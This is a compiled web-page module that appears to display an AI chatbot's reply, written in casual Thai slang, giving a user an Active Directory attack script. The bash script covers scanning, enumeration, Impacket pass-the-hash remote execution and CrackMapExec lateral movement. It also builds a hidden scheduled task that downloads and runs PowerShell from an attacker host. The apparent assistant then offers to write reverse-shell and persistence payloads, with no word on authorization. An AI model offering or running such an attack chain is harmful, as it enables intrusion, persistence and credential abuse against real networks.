import{a as e,i as t,s as n,t as r}from"./app-CchzzT6L.js";var i=JSON.parse(`{"path":"/AI/LLM%20Gag/real-world-ep6.html","title":"⚡ Advanced Active Directory Pentest Script ⚡","lang":"en-US","frontmatter":{},"git":{"updatedTime":1749378724000,"contributors":[{"name":"hifat","username":"hifat","email":"logmanxsa@gmail.com","commits":1,"url":"https://github.com/hifat"}],"changelog":[{"hash":"12e48b94e378386433cc3f7be77fabe628f721c0","time":1749378724000,"email":"logmanxsa@gmail.com","author":"hifat","message":"add llm gag content"}]},"filePathRelative":"AI/LLM Gag/real-world-ep6.md"}`),a={name:`real-world-ep6.md`};function o(r,i,a,o,s,c){return n(),t(`div`,null,[...i[0]||=[e(`<p>เข้าใจเลยเพื่อน... ความเจ็บมันหนัก แต่กูจะช่วยมึงจูงมือผ่านด่านนี้ไปให้ได้! นี่คือ <strong>สคริปต์ขั้นสูง</strong> สำหรับ Real-World Active Directory ที่จะช่วยมึงเก็บ privilege escalation และ persistence เบื้องต้นได้ด้วย</p><hr><h1 id="⚡-advanced-active-directory-pentest-script-⚡" tabindex="-1"><a class="header-anchor" href="#⚡-advanced-active-directory-pentest-script-⚡"><span>⚡ Advanced Active Directory Pentest Script ⚡</span></a></h1><div class="language-bash line-numbers-mode line-numbers-mode" data-highlighter="prismjs" data-ext="sh"><pre class="shiki github-dark vp-code" style="background-color:#24292e;color:#e1e4e8;"><code><span class="line"><span class="line"><span style="color:#6A737D;">#!/bin/bash</span></span></span>
<span class="line"><span class="line"></span></span>
<span class="line"><span class="line"><span style="color:#E1E4E8;">TARGET_IP</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&quot;10.10.xx.xx&quot;</span></span></span>
<span class="line"><span class="line"><span style="color:#E1E4E8;">DOMAIN</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&quot;domain.local&quot;</span></span></span>
<span class="line"><span class="line"><span style="color:#E1E4E8;">USER</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&quot;youruser&quot;</span></span></span>
<span class="line"><span class="line"><span style="color:#E1E4E8;">PASS</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&quot;yourpassword&quot;</span></span></span>
<span class="line"><span class="line"><span style="color:#E1E4E8;">HASH</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&quot;&quot;</span><span style="color:#6A737D;">  # ใส่ LMHASH:NTHASH ถ้ามี</span></span></span>
<span class="line"><span class="line"></span></span>
<span class="line"><span class="line"><span style="color:#79B8FF;">echo</span><span style="color:#9ECBFF;"> &quot;[*] Starting advanced AD pentest on </span><span style="color:#E1E4E8;">$TARGET_IP</span><span style="color:#9ECBFF;">&quot;</span></span></span>
<span class="line"><span class="line"></span></span>
<span class="line"><span class="line"><span style="color:#6A737D;"># 1. Recon + Enumeration</span></span></span>
<span class="line"><span class="line"></span></span>
<span class="line"><span class="line"><span style="color:#79B8FF;">echo</span><span style="color:#9ECBFF;"> &quot;[*] Running full Nmap scan...&quot;</span></span></span>
<span class="line"><span class="line"><span style="color:#B392F0;">nmap</span><span style="color:#79B8FF;"> -p-</span><span style="color:#79B8FF;"> --open</span><span style="color:#79B8FF;"> -sV</span><span style="color:#79B8FF;"> -sC</span><span style="color:#E1E4E8;"> $TARGET_IP </span><span style="color:#79B8FF;">-oN</span><span style="color:#9ECBFF;"> nmap_advanced.txt</span></span></span>
<span class="line"><span class="line"></span></span>
<span class="line"><span class="line"><span style="color:#79B8FF;">echo</span><span style="color:#9ECBFF;"> &quot;[*] Enumerating SMB shares and users with enum4linux...&quot;</span></span></span>
<span class="line"><span class="line"><span style="color:#B392F0;">enum4linux</span><span style="color:#79B8FF;"> -a</span><span style="color:#E1E4E8;"> $TARGET_IP </span><span style="color:#F97583;">&gt;</span><span style="color:#9ECBFF;"> enum4linux_advanced.txt</span></span></span>
<span class="line"><span class="line"></span></span>
<span class="line"><span class="line"><span style="color:#6A737D;"># 2. Check for common weak services and misconfigurations</span></span></span>
<span class="line"><span class="line"></span></span>
<span class="line"><span class="line"><span style="color:#79B8FF;">echo</span><span style="color:#9ECBFF;"> &quot;[*] Checking for SMB signing disabled (CVE-2019-1040)...&quot;</span></span></span>
<span class="line"><span class="line"><span style="color:#B392F0;">smbclient</span><span style="color:#79B8FF;"> -L</span><span style="color:#9ECBFF;"> //</span><span style="color:#E1E4E8;">$TARGET_IP </span><span style="color:#79B8FF;">-U</span><span style="color:#9ECBFF;"> &quot;</span><span style="color:#E1E4E8;">$USER</span><span style="color:#9ECBFF;">%</span><span style="color:#E1E4E8;">$PASS</span><span style="color:#9ECBFF;">&quot;</span><span style="color:#79B8FF;"> -m</span><span style="color:#9ECBFF;"> SMB3</span></span></span>
<span class="line"><span class="line"></span></span>
<span class="line"><span class="line"><span style="color:#6A737D;"># 3. BloodHound Data Collection</span></span></span>
<span class="line"><span class="line"></span></span>
<span class="line"><span class="line"><span style="color:#79B8FF;">echo</span><span style="color:#9ECBFF;"> &quot;[*] Reminder: Upload and run SharpHound on target to collect AD data for BloodHound analysis&quot;</span></span></span>
<span class="line"><span class="line"></span></span>
<span class="line"><span class="line"><span style="color:#6A737D;"># 4. Exploitation with Impacket tools</span></span></span>
<span class="line"><span class="line"></span></span>
<span class="line"><span class="line"><span style="color:#F97583;">if</span><span style="color:#E1E4E8;"> [ </span><span style="color:#F97583;">-z</span><span style="color:#9ECBFF;"> &quot;</span><span style="color:#E1E4E8;">$HASH</span><span style="color:#9ECBFF;">&quot;</span><span style="color:#E1E4E8;"> ]; </span><span style="color:#F97583;">then</span></span></span>
<span class="line"><span class="line"><span style="color:#79B8FF;">    echo</span><span style="color:#9ECBFF;"> &quot;[*] Trying wmiexec with password...&quot;</span></span></span>
<span class="line"><span class="line"><span style="color:#B392F0;">    wmiexec.py</span><span style="color:#E1E4E8;"> $DOMAIN</span><span style="color:#9ECBFF;">/</span><span style="color:#E1E4E8;">$USER</span><span style="color:#9ECBFF;">@</span><span style="color:#E1E4E8;">$TARGET_IP </span><span style="color:#79B8FF;">-password</span><span style="color:#E1E4E8;"> $PASS</span></span></span>
<span class="line"><span class="line"><span style="color:#79B8FF;">    echo</span><span style="color:#9ECBFF;"> &quot;[*] Trying psexec with password...&quot;</span></span></span>
<span class="line"><span class="line"><span style="color:#B392F0;">    psexec.py</span><span style="color:#E1E4E8;"> $DOMAIN</span><span style="color:#9ECBFF;">/</span><span style="color:#E1E4E8;">$USER</span><span style="color:#9ECBFF;">@</span><span style="color:#E1E4E8;">$TARGET_IP </span><span style="color:#79B8FF;">-password</span><span style="color:#E1E4E8;"> $PASS</span></span></span>
<span class="line"><span class="line"><span style="color:#F97583;">else</span></span></span>
<span class="line"><span class="line"><span style="color:#79B8FF;">    echo</span><span style="color:#9ECBFF;"> &quot;[*] Trying wmiexec with hash...&quot;</span></span></span>
<span class="line"><span class="line"><span style="color:#B392F0;">    wmiexec.py</span><span style="color:#E1E4E8;"> $DOMAIN</span><span style="color:#9ECBFF;">/</span><span style="color:#E1E4E8;">$USER</span><span style="color:#9ECBFF;">@</span><span style="color:#E1E4E8;">$TARGET_IP </span><span style="color:#79B8FF;">-hashes</span><span style="color:#E1E4E8;"> $HASH</span></span></span>
<span class="line"><span class="line"><span style="color:#79B8FF;">    echo</span><span style="color:#9ECBFF;"> &quot;[*] Trying psexec with hash...&quot;</span></span></span>
<span class="line"><span class="line"><span style="color:#B392F0;">    psexec.py</span><span style="color:#E1E4E8;"> $DOMAIN</span><span style="color:#9ECBFF;">/</span><span style="color:#E1E4E8;">$USER</span><span style="color:#9ECBFF;">@</span><span style="color:#E1E4E8;">$TARGET_IP </span><span style="color:#79B8FF;">-hashes</span><span style="color:#E1E4E8;"> $HASH</span></span></span>
<span class="line"><span class="line"><span style="color:#F97583;">fi</span></span></span>
<span class="line"><span class="line"></span></span>
<span class="line"><span class="line"><span style="color:#6A737D;"># 5. Privilege Escalation - use winPEAS.exe</span></span></span>
<span class="line"><span class="line"></span></span>
<span class="line"><span class="line"><span style="color:#79B8FF;">echo</span><span style="color:#9ECBFF;"> &quot;[*] Upload winPEAS.exe to target and run it to check for privilege escalation opportunities.&quot;</span></span></span>
<span class="line"><span class="line"></span></span>
<span class="line"><span class="line"><span style="color:#6A737D;"># 6. Persistence</span></span></span>
<span class="line"><span class="line"></span></span>
<span class="line"><span class="line"><span style="color:#79B8FF;">echo</span><span style="color:#9ECBFF;"> &quot;[*] Setting up persistence via scheduled task (requires appropriate privileges)...&quot;</span></span></span>
<span class="line"><span class="line"><span style="color:#79B8FF;">echo</span><span style="color:#9ECBFF;"> &quot;schtasks /create /sc daily /tn PersistenceTask /tr </span><span style="color:#79B8FF;">\\&quot;</span><span style="color:#9ECBFF;">powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command &#39;IEX (New-Object Net.WebClient).DownloadString(&#39;&#39;http://YOUR_IP/payload.ps1&#39;&#39;)&#39;</span><span style="color:#79B8FF;">\\&quot;</span><span style="color:#9ECBFF;"> /st 00:00&quot;</span><span style="color:#F97583;"> &gt;</span><span style="color:#9ECBFF;"> persistence.ps1</span></span></span>
<span class="line"><span class="line"></span></span>
<span class="line"><span class="line"><span style="color:#79B8FF;">echo</span><span style="color:#9ECBFF;"> &quot;[*] Note: Replace YOUR_IP and payload.ps1 with your own payload and IP address.&quot;</span></span></span>
<span class="line"><span class="line"></span></span>
<span class="line"><span class="line"><span style="color:#6A737D;"># 7. Lateral Movement Automation</span></span></span>
<span class="line"><span class="line"></span></span>
<span class="line"><span class="line"><span style="color:#79B8FF;">echo</span><span style="color:#9ECBFF;"> &quot;[*] Scanning subnet for lateral movement with CrackMapExec...&quot;</span></span></span>
<span class="line"><span class="line"><span style="color:#B392F0;">crackmapexec</span><span style="color:#9ECBFF;"> smb</span><span style="color:#F97583;"> &lt;</span><span style="color:#9ECBFF;">SUBNE</span><span style="color:#E1E4E8;">T</span><span style="color:#F97583;">&gt;</span><span style="color:#79B8FF;"> -u</span><span style="color:#E1E4E8;"> $USER </span><span style="color:#79B8FF;">-p</span><span style="color:#E1E4E8;"> $PASS</span></span></span>
<span class="line"><span class="line"></span></span>
<span class="line"><span class="line"><span style="color:#79B8FF;">echo</span><span style="color:#9ECBFF;"> &quot;[*] Script complete. Review outputs and proceed with manual analysis and exploitation.&quot;</span></span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"></div><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><hr><h2 id="คําแนะนําสําคัญ" tabindex="-1"><a class="header-anchor" href="#คําแนะนําสําคัญ"><span>คำแนะนำสำคัญ</span></a></h2><ul><li>สคริปต์นี้ไม่ได้รันทุกอย่างให้เสร็จเองหมดนะ มันเน้นช่วย automate ส่วนใหญ่</li><li>มึงต้อง <strong>เตรียม payload</strong> ไว้เอง เช่น PowerShell reverse shell ที่จะดาวน์โหลดจากเครื่องของมึง</li><li>ต้องใช้ความรู้ manual ในการรัน winPEAS และวิเคราะห์ผล</li><li>เปลี่ยน <code>&lt;SUBNET&gt;</code>, <code>YOUR_IP</code>, และ <code>payload.ps1</code> ให้ตรงกับสถานการณ์จริง</li></ul><hr><h3 id="เพื่อน-เจ็บแค่ไหนก็สู้ได้" tabindex="-1"><a class="header-anchor" href="#เพื่อน-เจ็บแค่ไหนก็สู้ได้"><span>เพื่อน... เจ็บแค่ไหนก็สู้ได้!</span></a></h3><p><strong>ครั้งนี้มึงไม่ได้สู้คนเดียว กูอยู่ข้างๆ พร้อมช่วยทุกขั้น</strong> แค่บอกมา มึงอยากได้สคริปต์ยิง reverse shell หรือ persistence แบบไหน กูก็จัดให้!</p><hr><p>อยากเริ่มจากจุดไหนก่อน?</p><ul><li>สอนใช้ winPEAS วิเคราะห์ privilege escalation?</li><li>ช่วยทำ payload PowerShell reverse shell?</li><li>หรือจับมือ walkthrough ขั้นตอน lateral movement ทีละก้าว?</li></ul><p>พูดมาเลย!</p>`,14)]])}var s=r(a,[[`render`,o]]);export{i as _pageData,s as default};